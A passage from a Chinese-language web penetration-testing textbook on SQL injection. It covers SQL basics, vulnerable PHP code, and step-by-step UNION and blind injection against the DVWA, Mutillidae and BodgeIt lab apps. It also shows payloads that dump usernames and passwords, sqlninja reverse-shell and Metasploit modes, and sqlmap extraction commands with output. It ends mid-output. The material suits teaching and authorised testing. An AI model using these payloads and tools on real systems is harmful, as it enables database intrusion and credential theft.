  \n为了允许用户选择要查看的信息或根据其个人资料过滤可查看的内容，会使用从 Cookie、输入表单和 URL 变量中获取的输入来构建 SQL 语句，然后将这些语句传回数据库进行处理。由于用户输入参与了\
  \ SQL 语句的构建，应用程序的开发人员需要在将其传递给后端数据库之前仔细验证它。如果未正确进行此验证，恶意用户可能能够发送 SQL 查询和命令，这些查询和命令将被数据库引擎执行，而不是作为预期值进行处理。\n\
  \n利用用户输入的信任，迫使服务器执行 SQL 查询而不是将值用作过滤参数的攻击类型称为 SQL 注入。\n\n## SQL 入门\n\n为了理解 SQL 注入漏洞，首先你需要具备一些\
  \ SQL 知识。首先，让我们看一些基本数据库概念：\n\n- **列或字段：** 列或字段是指所有实体单一特征的一个特定数据片段，例如用户名、地址或密码。\n\
  - **行或记录：** 行或记录是一组信息，或一组字段值，与单个实体相关，例如与单个用户或单个客户相关的信息。\n- **表：** 表是包含关于同一类型元素的记录的列表，例如用户表、产品表或博客文章表。\n\
  - **数据库：** 数据库是与同一系统或系统组相关联的整个表集，通常彼此相关。例如，在线商店数据库可能包含客户、产品、销售、价格、供应商和员工用户的表。\n\n\
  为了获取此类复杂结构的信息，几乎所有现代编程语言和数据库管理系统（DBMS）都支持使用 SQL。SQL 允许开发人员对数据库执行以下操作：\n\n| 语句 |\
  \ 描述 |\n|---|---|\n| CREATE | 用于创建数据库和表 |\n| SELECT | 允许从数据库检索信息 |\n| UPDATE | 允许修改数据库中现有数据\
  \ |\n| INSERT | 允许在数据库中插入新数据 |\n| DELETE | 用于从数据库中删除记录 |\n| DROP | 用于永久删除表和数据库 |\n\
  \n还支持其他更复杂的功 能，例如存储过程、完整性检查、备份和文件系统访问，其实现主要取决于所使用的 DBMS。\n\n大多数合法的 SQL 操作任务都是使用上述语句执行的。然而，DELETE\
  \ 和 DROP 语句如果使用不受控制，可能会导致信息丢失。在渗透测试中，使用 DROP 或 DELETE 尝试 SQL 注入攻击是不鼓励的，或者我应该说，除非客户明确要求，否则是禁止的。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_212_0.png)\n\nSQL 语句中的 ;（分号）元字符的使用方式与命令注入中类似，用于在同一行组合多个查询。\n\
  \n## SELECT 语句\n\n日常数据库使用中的基本操作是检索信息。这是通过 SELECT 完成的。基本语法如下：\n\n```\nSELECT [elements]\
  \ FROM [table] WHERE [condition]\n```\n\n这里，elements 可以是通配符（例如，* 选择所有内容），或你想要检索的列列表。table\
  \ 是你想要检索信息的表。WHERE 子句是可选的，如果使用，查询将只返回满足条件的行。例如，你可以选择所有价格低于 100 美元（USD）的产品的名称、描述和价格列：\n\
  \n```\nSELECT name,description,price FROM products WHERE price<100\n```\n\nWHERE\
  \ 子句也可以使用布尔运算符来创建更复杂的条件：\n\n```\nSELECT columnA FROM tableX WHERE columnE='employee'\
  \ AND columnF=100;\n```\n\n前面的 SQL 语句将在满足 WHERE 子句后条件的情况下返回名为 tableX 的表中的 columnA\
  \ 的值；即 columnE 具有 employee 字符串值且 columnF 具有 100 值。\n\n## 存在漏洞的代码\n\n与前面讨论的命令注入漏洞类似，使用\
  \ GET 方法传递的变量也经常用于构建 SQL 语句。例如，/books.php?userinput=1 URL 将显示第一本书的信息。\n\n在以下 PHP\
  \ 代码中，用户通过 GET 方法提供的输入直接添加到 SQL 语句中。MySQL_query() 函数将把 SQL 查询发送到数据库，而 MySQL_fetch_assoc()\
  \ 函数将以数组格式从数据库获取数据：\n\n```\n<?php\n$stockID = $_GET[\"userinput\"];\n$SQL= \"SELECT\
  \ * FROM books WHERE ID=\" . $stockID;\n$result= MySQL_query($SQL);\n$row = MySQL_fetch_assoc($result);\n\
  ?>\n```\n\n如果没有适当的输入验证，攻击者可以控制 SQL 语句。如果你将 URL 更改为 /books.php?userinput=10-1，以下查询将被发送到后端数据库：\n\
  \n```\nSELECT * FROM books WHERE ID=10-1\n```\n\n如果显示了第九本书的信息，你可以得出结论，应用程序容易受到 SQL\
  \ 注入攻击，因为未经过滤的输入直接发送到执行减法的数据库。\n\nSQL 注入漏洞存在于 Web 应用程序中，而不是数据库服务器上。\n\n## SQL 注入测试方法\n\
  \n在上一节中，你见证了对存在漏洞代码的攻击结果。显而易见的是，如果用户输入在未经先前验证的情况下使用，并直接连接到 SQL 查询中，用户可以注入不同的值或代码，这些值或代码将被数据库中的\
  \ SQL 解释器处理和执行。但是，如果你无法访问源代码怎么办？这是在渗透测试中最可能出现的场景；那么，你如何识别此类漏洞呢？\n\n答案是通过尝试简单的注入字符串并分析服务器的响应。让我们使用\
  \ Damn Vulnerable Web Application（DVWA）来看一个简单的例子。在 SQL 注入部分，如果你在文本框中输入任何数字，例如 2，你将获得具有此\
  \ ID 的用户的信息：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_214_0.png)\n\n现在尝试提交一个\
  \ '（撇号）字符而不是数字，你会看到响应是一个非常详细的错误消息：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_215_0.png)\n\
  \n仅此响应就告诉我们该参数容易受到注入的影响，因为它表明在提交 ID 时出现语法错误，注入撇号形成的查询如下：\n\n```\nSELECT first_name,\
  \ last_name FROM users WHERE user_id = ''\n```\n\n注入的字符关闭了开头的撇号。代码中已有的撇号被留空，这在 DBMS\
  \ 尝试解释该语句时会产生错误。\n\n检测注入的另一种方法是让解释器执行布尔操作。尝试提交类似 2' and '1'='1 的内容。请注意，你没有发送第一个和最后一个撇号——这些将由\
  \ SQL 语句中已有的撇号补全，正如从之前的错误消息中推断的那样。有时，你需要尝试多种带撇号和不带撇号、括号和其他分组字符的组合，以发现语句的实际构造方式：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_215_1.png)\n\n结果是 ID=2 的相同用户。这是预期结果，因为你附加了一个始终为真的条件；即\
  \ and '1'='1'。\n\n\n\n\n\n接下来，尝试一个恒假的：2' and '1'='2：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_216_0.png)\n\
  \n从浏览器地址栏可以看到，ID 的提交是通过 GET 请求完成的。对于假条件，响应为空文本而不是用户的详细信息。因此，即使 ID=2 的用户存在，句子的第二个条件也是假的，结果为空。这表明你可以将\
  \ SQL 代码注入到查询中并可能从数据库中提取信息。\n\n以下其他有用的测试字符串可能有助于你识别 SQL 注入：\n\n+   - **对数值输入的算术运算**：包括\
  \ 2+1、-1 和 0+1。\n+   - **字母值**：当期望数字时使用这些（a、b、c、...）。\n+   - **分号 (;)**：在大多数 SQL\
  \ 实现中，分号表示句子的结束。你可以注入一个分号后跟另一个 SQL 句子，例如 SLEEP 或 WAITFOR，然后比较响应时间。如果它与你提供的暂停一致，则存在注入漏洞。\n\
  +   - **注释**：注释标记（#、//、/*、--）使解释器忽略注释后的所有内容。通过在有效值后注入这些，你应该得到与仅提交该值时不同的响应。\n+  \
  \ - **双引号 (\")**：这可以代替撇号或单引号来分隔字符串。\n\n+   - **通配符、字符 %（百分号）和 _（下划线）：** 这些也可以在 WHERE\
  \ 条件中使用，因此如果代码存在漏洞，你可以注入它们；% 表示所有字符串，_ 表示任意一个字符。例如，如果使用 LIKE 运算符而不是 =，如以下 PHP 字符串连接中，如果我们提交百分号字符（%），你将获得所有用户作为结果：\n\
  \n```\n\"SELECT first_name, last_name FROM users WHERE first_name LIKE '$name'\"\
  \n```\n\n或者，如果你提交类似 \"Ali__\"（两个下划线）的内容，你可能会得到诸如 \"Alice\"、\"Aline\"、\"Alica\"、\"\
  Alise\" 和 \"Alima\" 等结果。\n\n+   - **UNION 运算符：** 这用于在 SQL 中合并两个查询的结果。作为条件，两个查询的结果需要具有相同数量的列。因此，如果你有一个返回三个的易受攻击的查询，像上面所示的那样（选择两列），并注入类似\
  \ UNION SELECT 1, 2 的内容，你将得到有效结果，或者如果你注入 UNION SELECT 1, 2, 3，你将得到错误。如果结果相同，无论列数多少，或差异不一致，该输入可能不受攻击。\n\
  \n## 使用 SQL 注入提取数据\n\n为了利用 SQL 注入漏洞并从数据库中提取数据，你首先需要了解查询是如何构建的，这样你就知道如何以及在哪里注入你的有效载荷。\n\
  \n发现存在注入漏洞有助于你弄清楚 WHERE 条件是如何制定的。你还需要知道选择了多少列以及哪些列实际返回给客户端。\n\n要获取列数，你可以使用 ORDER\
  \ BY。从在有效值后注入 ORDER BY 1 开始，按第一行排序结果，然后按第二行，依此类推，直到你因尝试使用不存在的行号对结果排序而收到错误：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_218_0.png)\n\
  \n正如前面的屏幕截图所示，当按第 3 列排序时查询失败，这告诉你它只返回两列。另外，请注意在地址栏中，你的注入是 2' order by 3 -- '，你需要添加注释以使解释器忽略查询的其余部分，因为在\
  \ SQL 中 ORDER 必须始终位于句子的末尾。你还需要在注释前后添加空格（浏览器在地址栏中用 + 替换它们）并在末尾关闭单引号以防止语法错误。\n\n现在你知道查询返回两列，要查看它们在响应中的呈现方式，请使用\
  \ UNION。通过提交 2' union select 1,2 -- '，你会看到第一列是名字，第二列是姓氏：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_218_1.png)\n\
  \n现在你可以开始从数据库中提取信息。\n\n## 获取基本环境信息\n\n为了从数据库中提取信息，你需要知道要查找什么：数据库有哪些？我们的用户可以访问其中哪些？有哪些表，它们有哪些列？这是你需要向服务器询问的初始信息，以便能够查询你希望获得的数据：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_219_0.png)\n\n使用 DVWA 示例，鉴于你只有两列来获取信息，首先询问数据库名称和应用程序用于连接到\
  \ DBMS 的用户。\n\n这是使用 MySQL 中预定义的 database() 和 user() 函数完成的：\n\n## 漏洞：SQL 注入\n\n用户\
  \ ID：\n\n```\nID: 2' union SELECT schema_name,2 FROM information_schema.schemata\
  \ -- '\nFirst name: Gordon\nSurname: Brown\n```\n\n```\nID: 2' union SELECT schema_name,2\
  \ FROM information_schema.schemata -- '\nFirst name: information_schema\nSurname:\
  \ 2\n```\n\n```\nID: 2' union SELECT schema_name,2 FROM information_schema.schemata\
  \ -- '\nFirst name: dvwa\nSurname: 2\n```\n\n你也可以通过注入以下内容来请求服务器上的数据库列表：\n\n```\n\
  2' union SELECT schema_name,2 FROM information_schema.schemata -- '\n```\n\n## 漏洞：SQL\
  \ 注入\n\n用户 ID：\n\n```\nID: 2' union SELECT table_name,2 FROM information_schema.tables\
  \ WHERE table_schema = 'dvwa' -- '\nFirst name: Gordon\nSurname: Brown\n```\n\n\
  ```\nID: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema\
  \ = 'dvwa' -- '\nFirst name: guestbook\nSurname: 2\n```\n\n```\nID: 2' union SELECT\
  \ table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '\n\
  First name: users\nSurname: 2\n```\n\ninformation_schema 是包含 MySQL 所有配置和数据库定义信息的数据库，因此\
  \ dvwa 应该是对应目标应用程序的数据库。现在让我们查询该数据库中包含的表：\n\n```\n2' union SELECT table_name,2 FROM\
  \ information_schema.tables WHERE table_schema = 'dvwa' -- '\n```\n\n正如屏幕截图所示，我们正在查询\
  \ information_schema.tables 表中定义的所有表的表名，其中 table_schema（或数据库名称）为 'dvwa'。从那里，你可以获得包含用户信息表的名称，你也可以询问其列和每列的类型：\n\
  \n```\n2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema\
  \ = 'dvwa' and table_name = 'users' --'\n```\n\n你应该在每个请求中选择一个或两个信息片段，因为你只有两个字段来显示信息。SQL\
  \ 提供了 CONCAT 函数，它连接两个或多个字符串。你可以使用它将多个字段放在单个值中。你将使用 CONCAT 在单个查询中提取用户 ID、名字和姓氏、用户名和密码：\n\
  \n```\n2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password)\
  \ from dvwa.users -- '\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_221_0.png)\n\
  \n## 盲 SQL 注入\n\n到目前为止，我们已经识别并利用了一个常见的 SQL 注入漏洞，其中请求的信息显示在服务器的响应中。然而，还有另一种类型的 SQL\
  \ 注入，即服务器响应不会揭示实际的详细信息，无论是否存在。这称为盲 SQL 注入。\n\n要检测盲 SQL 注入，你需要形成得到是或否响应的查询。这意味着查询在结果为正或负时以一致的方式响应，以便你可以区分两者。这可以基于响应的内容、响应代码或某些注入命令的执行。在最后一类中，最常见的方法是注入暂停命令并根据响应时间检测真或假（基于时间的注入）。为了澄清这一点，让我们用\
  \ DVWA 做一个快速练习。你还将使用 Burp Suite 来促进请求的重新提交。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_222_0.png)\n\
  \n在基于时间的注入中，形成一个查询，旨在在结果为真时暂停处理 N 秒，如果结果为假，则不暂停执行查询。为此，在 MySQL 中使用 SLEEP (N) 函数，在\
  \ MS SQL Server 中使用 WAITFOR DELAY '0:0:N' 函数。如果服务器需要这么长时间来响应，结果为真。\n\n首先，转到 SQL\
  \ Injection (Blind)。你会看到与另一个 SQL 注入练习相同的 User ID 文本框。如果你提交一个数字，它会显示对应用户的名字和姓氏。这次，然而，如果你提交一个撇号或单引号，它会显示空响应。但如果你提交\
  \ 1' ' 会怎样？它显示用户 1 的信息；因此它是可注入的：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_222_1.png)\n\
  \n\n\n\n\n让我们回顾一下你现在掌握的信息。存在一个 ID=1 的有效用户。如果你提交错误的查询或不存在的用户，结果只是一个空的信息空间。然后有真和假两种状态。你可以通过提交\
  \ 1' 和 '1'='1 以及 1' 和 '1'='2 来测试这些：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_223_0.png)\n\
  \n假响应显示在以下截图中。注意浏览器地址栏中某些字符被编码了（例如，'=' 被编码为 '%3D'）：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_223_1.png)\n\
  \n要提问是/否问题，你必须将 '1'='1' 替换为应返回 true 或 false 的查询。你已经知道应用程序的数据库名称是 'dvwa'。现在提交以下内容：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_224_0.png)\n\n```\n1' and database()='dvwa\n\
  ```\n\n你在这里得到了一个积极的响应。记住你不包含第一和最后一个引号，因为它们已经在应用程序代码中了。你怎么知道的？你需要逐个字符迭代以找到每个字母，提出诸如“当前数据库名称是否以\
  \ ? 开头”这样的问题。这可以通过表单或 Burp 的 Repeater 一次一个字符地完成，也可以通过 Burp 的 Intruder 来自动化。\n\n\
  从代理历史中发送一个有效请求到 Intruder，并按以下截图所示设置输入：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_224_1.png)\n\
  \n注意在 a 设置为输入后，有 %25。这是 URL 编码的 %（百分号）字符。URL 编码由浏览器自动完成，有时服务器需要正确解释发送的字符。编码也可以用于绕过某些基本验证过滤器。百分号字符，如前所述，是匹配任何字符串的通配符。在这里我们说如果用户\
  \ ID 为 1，当前数据库的名称以 a 开头，后面跟任意内容；有效载荷列表将是字母表中的所有字母和 0 到 9 的数字。SQL 字符串比较不区分大小写，除非特别指定。这意味着\
  \ A 与 a 相同：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_225_0.png)\n\n你现在有了输入位置和有效载荷，但你将如何区分真响应和假响应？你需要在真或假结果中匹配某个字符串。你知道真响应始终包含\
  \ First name 文本，因为它显示了用户信息。我们可以为此创建一个 Grep - Match 规则：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_226_0.png)\n\
  \n现在开始攻击，你会看到 d 与一个真响应匹配：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_227_0.png)\n\
  \n要找到第二个字符，只需将 d（结果）前置到输入位置即可：\n\n```\nGET /dvwa/vulnerabilities/sqli_blind/?id=1'and+database()like'dsa%'&Submit=Submit\
  \ HTTP/1.1\nHost: 10.7.7.5\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0)\
  \ Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\
  Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.7.7.5/dvwa/vulnerabilities/sqli_blind/?id=1%27%26Submit=Submit\n\
  Cookie: security=low; PHPSESSID=nctnb4t0oumnnb8q0ct9f5cau1\nConnection: close\n\
  Upgrade-Insecure-Requests: 1\n```\n\n再次开始攻击，你会看到 v 是下一个字符：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_228_0.png)\n\
  \n继续此过程，直到没有可能的输入返回积极响应。你也可以构造第一轮查询以使用以下注入获得名称的长度，并迭代最后一个数字直到找到正确的长度值：\n\n```\n\
  1' +and+char_length(database())=1+--+ '\n```\n\n记住，由于 Intruder 不像浏览器那样添加编码，你可能需要自己添加或在有效载荷配置中配置。在这里我们用\
  \ + 符号替换了所有空格。另外，注意由于 char_length() 的返回值是整数，你需要在其后添加注释并关闭引号。\n\n关于最常见 DBMS 的 SQL\
  \ 注入有用 SQL 命令的优秀参考可以在 PentestMonkey 的 SQL 注入备忘单 http://pentestmonkey.net/category/cheat-sheet/sql-injection\
  \ 上找到。\n\n## 自动化利用\n\n正如前一节所示，利用 SQL 注入漏洞可能是一项棘手且耗时的任务。幸运的是，渗透测试人员有一些有用的工具可用于自动化从易受攻击的应用程序中提取信息的任务。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_229_0.png)\n\n即使这里介绍的工具不仅可以用于利用，还可以用于检测漏洞，也不建议你以这种方式使用它们，因为它们的模糊机制会产生大量流量；它们无法轻松监督，你对它们向服务器发出的请求类型控制有限。这增加了对数据的损害风险，并使诊断事件变得更加困难，即使保留了所有日志。\n\
  \n## sqlninja\n\n**sqlninja** 工具可以帮助你利用使用 Microsoft SQL Server 作为后端数据库的应用程序中的 SQL\
  \ 注入缺陷。使用 sqlninja 工具的最终目标是通过 SQL 注入缺陷获得对数据库服务器的控制。sqlninja 工具是用 Perl 编写的，可以在 Kali\
  \ 中通过导航到 **Applications | Database Assessments** 找到。sqlninja 工具不能用于检测注入缺陷的存在，而只能用于利用缺陷以获得对数据库服务器的\
  \ shell 访问。以下是 sqlninja 的一些重要功能：\n\n- 用于指纹识别远程 SQL 服务器以识别版本、用户权限、数据库身份验证模式和 `xp_cmdshell`\
  \ 可用性\n- 用于通过 SQLi 在目标上上传可执行文件\n- 与 Metasploit 集成\n- 通过混淆代码使用 WAF 和 IPS 规避技术\n-\
  \ 使用 DNS 和 ICMP 协议进行 Shell 隧道\n- 对旧版本 MS SQL 的 `sa` 密码进行暴力破解\n\nsqlninja 工具与 sqlmap\
  \ 类似，可以与 Metasploit 集成，你可以使用它在工具利用注入缺陷并创建本地 shell 时通过 `meterpreter` 会话连接到目标服务器。sqlninja\
  \ 所需的所有信息都保存在配置文件中。Kali Linux 中的示例配置文件保存在 `/usr/share/doc/sqlninja/sqlninja.conf.example.gz`。你需要使用\
  \ `gunzip` 命令解压它。你可以使用 Leafpad 编辑文件，并通过从 Burp 等代理导出将其 HTTP 请求保存到其中。你还需要指定目标将连接到的本地\
  \ IP 地址。工具中包含一份详细的逐步 HTML 指南，可以在与配置相同的位置找到，文件名为 `sqlninja-how.html`。\n\n配置文件看起来类似于以下截图所示。--\
  \ httprequest_start -- 和 --httprequest_end-- 是标记，必须在 HTTP 请求的开始和结束处定义：\n\n```\n\
  ########## HTTP REQUEST ##########\n--httprequest_start--\nPOST http://192.168.1.70/mutillidae/index.php?page=view-someones-blog.php\
  \ HTTP/1.1\nHost: 192.168.1.70\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0)\
  \ Gecko/20100101 Firefox/31.0 Iceweasel/31\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\
  Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.70/mutillidae/index.php?page=view-someones-blog.php\n\
  Cookie: showhints=0; PHPSESSID=hba9jthgbslqkq7oj5e8e12611; acopendivids=swingset,lotto,phpbb2\n\
  Connection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length:\
  \ 67\n\nauthor=bobby'; SQL2INJECT__ &view-someones-blog-php-submit-button=View+Blog+Entries\n\
  --httprequest_end--\n\n# Local host: your IP address (for backscan and revshell\
  \ modes)\nlhost = 192.168.1.69\n\n# Interface to sniff when in backscan mode\ndevice\
  \ = eth0\n```\n\nsqlninja 工具包含多个模块，如以下截图所示。每个模块都是为了使用不同的协议和技术获得对服务器的访问而创建的：\n\n\
  ```\nroot@kali-1:/home# sqlninja\nSqlninja rel. 0.2.6-r1\nCopyright (C) 2006-2011\
  \ icesurfer <r00t@northernfortress.net>\nUsage: /usr/bin/sqlninja\n    -m <mode>\
  \ : Required. Available modes are:\n    t/test   - test whether the injection is\
  \ working\n    f/fingerprint - fingerprint user, xp_cmdshell and more\n    b/bruteforce\
  \ - bruteforce sa account\n    e/escalation - add user to sysadmin server role\n\
  \    x/resurrectxp - try to recreate xp_cmdshell\n    u/upload  - upload a .scr\
  \ file\n    s/dirshell - start a direct shell\n    k/backscan - look for an open\
  \ outbound port\n    r/revshell - start a reverse shell\n    d/dnstunnel - attempt\
  \ a dns tunneled shell\n    i/icmpshell - start a reverse ICMP shell\n    c/sqlcmd\
  \  - issue a 'blind' OS command\n    m/metasploit - wrapper to Metasploit stagers\n\
  ```\n\n\n\n要开始利用，输入以下命令：\n\n```\nsqlninja -f <path to config file > -m m\n```\n\n\
  sqlninja 工具现在将开始注入 SQL 查询进行利用，并在完成后返回一个 meterpreter 会话。利用它，你可以完全控制目标。数据库系统作为网络上至关重要的服务器，始终是恶意攻击者最有吸引力的目标。诸如\
  \ sqlninja 之类的工具可以帮助你了解 SQL 注入漏洞的严重性，在你的对手攻击它之前。攻击者获得对数据库服务器的 shell 访问权限，是 IT 安全专业人员最不希望看到的事情。\n\
  \n## BBQSQL\n\nKali Linux 包含一个专门用于利用盲 SQL 注入漏洞的工具。BBQSQL 是一个用 Python 编写的工具。它是一个菜单驱动的工具，会询问多个问题，然后根据你的回答构建注入攻击。它是能够以极高准确度自动化测试盲\
  \ SQL 注入漏洞的最快工具之一。\n\nBBQSQL 工具可以配置为使用二进制或频率搜索技术。它还可以自定义以在 HTTP 响应中查找特定值，以便确定 SQL\
  \ 注入是否成功。\n\n如以下屏幕截图所示，该工具提供了一个不错的菜单驱动向导。URL 和参数在第一个菜单中定义，输出文件也在其中定义，而使用的技术和响应解释规则则在第二个菜单中定义：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_232_0.png)\n\n## sqlmap\n\nsqlmap 工具或许是目前最完整的\
  \ SQL 注入工具。它自动化了发现 SQL 注入漏洞、准确猜测数据库类型并利用注入漏洞接管整个数据库服务器的过程。它还可以在利用注入后用作远程 shell，或者可以触发\
  \ Metasploit 有效载荷（如 Meterpreter）以获得更高级的访问权限。\n\nsqlmap 的一些功能如下：\n\n- 它提供对所有主要数据库系统的支持\n\
  - 它对基于错误和盲 SQL 注入都有效\n- 它可以枚举表和列名，还可以提取用户和密码哈希\n- 它可以通过利用注入漏洞支持文件的下载和上传\n- 它可以使用不同的编码和篡改技术来绕过诸如过滤、WAF\
  \ 和 IPS 之类的防御机制\n- 它可以在数据库服务器上运行 shell 命令\n- 它可以与 Metasploit 集成\n\n在 Kali Linux\
  \ 中，可以通过导航到 **Applications | Database Assessment** 找到 sqlmap。要使用该工具，首先需要找到要测试 SQL\
  \ 注入的输入参数。如果变量通过 GET 方法传递，你可以向 sqlmap 工具提供 URL，它将自动进行测试。你也可以使用 -p 选项明确告诉 sqlmap\
  \ 只测试特定参数。在以下示例中，我们正在测试 `username` 变量是否存在注入漏洞。如果发现存在漏洞，`--schema` 选项将列出 information\
  \ schema 数据库的内容。这就是包含所有数据库及其表的信息的数据库：\n\n```\nsqlmap -u\n\"http://10.7.7.5/mutilidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details\"\
  \ -p username --schema\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_233_0.png)\n\
  \n如果要注入的参数是通过 POST 方法传递的，可以将一个 HTTP 文件作为输入提供给 sqlmap，其中包含头部和参数。HTTP 文件可以使用 Burp\
  \ 等代理生成，通过复制捕获流量时在 Raw 选项卡下显示的数据。\n\n该文件将类似于以下屏幕截图所示的内容：\n\n```\nroot@kali:~/WebPentest#\
  \ cat bodgeit_login.txt\nPOST http://10.7.7.5/bodgeit/login.jsp HTTP/1.1\nUser-Agent:\
  \ Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept:\
  \ text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:\
  \ en-US,en;q=0.5\nReferer: http://10.7.7.5/bodgeit/login.jsp\nCookie: security_level=0;\
  \ JSESSIONID=5CFA79D293718053B95752E719C507CF; acopendivids=swingset,jotto,\nConnection:\
  \ keep-alive\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\n\
  Content-Length: 21\nHost: 10.7.7.5\n```\n\n然后可以将 HTTP 文件作为输入提供给 sqlmap。`--threads`\
  \ 选项用于选择向应用程序发送的并发 HTTP 请求数。`--current-db` 选项将提取应用程序使用的数据库名称，而 `--current-user`\
  \ 提取应用程序连接到数据库的用户名：\n\n```\nsqlmap -r bodgeit_login.txt -p username --current-db\
  \ --current-user --threads 5\n```\n\n该命令会产生以下输出。数据库的名称为 PUBLIC，用户名为 SA：\n\n```\n\
  Parameter: username (POST)\n  Type: boolean-based blind\n  Title: OR boolean-based\
  \ blind - WHERE or HAVING clause\n  Payload: username=-3658' OR 7354=7354-- HLCM&password=23\n\
  \n  Type: UNION query\n  Title: Generic UNION query (NULL) - 5 columns\n  Payload:\
  \ username=23' UNION ALL SELECT NULL,CHAR(113)||CHAR(122)||CHAR(106)||CHAR(112)||CHAR(113)||CHAR(98)||CHAR(84)||CHAR(104)||CHAR(119)||CHAR(83)||CHAR(110)||CHAR(105)||CHAR(8\
  \ 4)||CHAR(107)||CHAR(82)||CHAR(70)||CHAR(99)||CHAR(84)||CHAR(75)||CHAR(88)||CHAR(111)||CHAR(1\
  \ 19)||CHAR(99)||CHAR(90)||CHAR(109)||CHAR(117)||CHAR(117)||CHAR(115)||CHAR(111)||CHAR(111)||CHAR(122)||C\
  \ HAR(120)||CHAR(75)||CHAR(101)||CHAR(101)||CHAR(117)||CHAR(108)||CHAR(97)||CHAR(97)||CHAR(77)||CHAR(77)||CHAR(77)||CHAR(88)||CHAR(84)||CHAR(65)||CHAR(112)||CHAR(115)||CHAR(66)||CHAR(113)||CHAR(77)||CHAR(77)||CHAR(77)||CHAR(120)||CHAR(113)||NULL,NULL,NULL\
  \ FROM INFORMATION_SCHEMA.SYSTEM_USERS-- Diyq&password=23\n\n[00:18:08] [INFO] the\
  \ back-end DBMS is HSQLDB\nback-end DBMS: HSQLDB 1.7.2\n[00:18:08] [INFO] fetching\
  \ current user\n[00:18:08] [WARNING] reflective value(s) found and filtering out\n\
  current user: 'SA'\ncurrent schema (equivalent to database on HSQLDB): 'PUBLIC'\n\
  [00:18:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.7.7.5'\n\
  [*] shutting down at 00:18:08\n```\n\n在确定数据库名称后，可以使用 `--tables` 和 `--columns` 选项提取有关表和列的信息。此外，还可以使用\
  \ `--data` 选项定义 POST 参数，而无需使用包含请求的文件。注意使用 \" （引号）；它们用于使 Linux shell 将整组参数解释为一个字符串并转义\
  \ & （与号）字符，因为它是 Unix 系统命令行中的保留运算符：\n\n```\nsqlmap -u http://10.7.7.5/bodgeit/login.jsp\
  \ --data \"username=23&password=23\" -D public --tables\n```\n\n你将看到以下输出：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_235_0.png)\n\
  \n要提取特定表的全部数据，我们使用 `--dump` 选项加上 -D 指定数据库和 -T 指定表：\n\n```\nsqlmap -u http://10.7.7.5/bodgeit/login.jsp\
  \ --data \"username=23&password=23\" -D public -T users --dump\n```\n\n让我们看一个输出示例：\n\
  \n```\n[01:13:09] [INFO] the back-end DBMS is HSQLDB\nweb application technology:\
  \ JSP\nback-end DBMS: HSQLDB 1.7.2\n[01:13:09] [INFO] fetching columns for table\
  \ 'USERS' in database 'PUBLIC'\n[01:13:09] [INFO] used SQL query returns 5 entries\n\
  [01:13:09] [INFO] resumed: \"CURRENTBASKETID\",\"INTEGER\"\n[01:13:09] [INFO] resumed:\
  \ \"NAME\",\"VARCHAR\"\n[01:13:09] [INFO] resumed: \"PASSWORD\",\"VARCHAR\"\n[01:13:09]\
  \ [INFO] resumed: \"TYPE\",\"VARCHAR\"\n[01:13:09] [INFO] resumed: \"USERID\",\"\
  INTEGER\"\n[01:13:09] [INFO] fetching entries for table 'USERS' in database 'PUBLIC'\n\
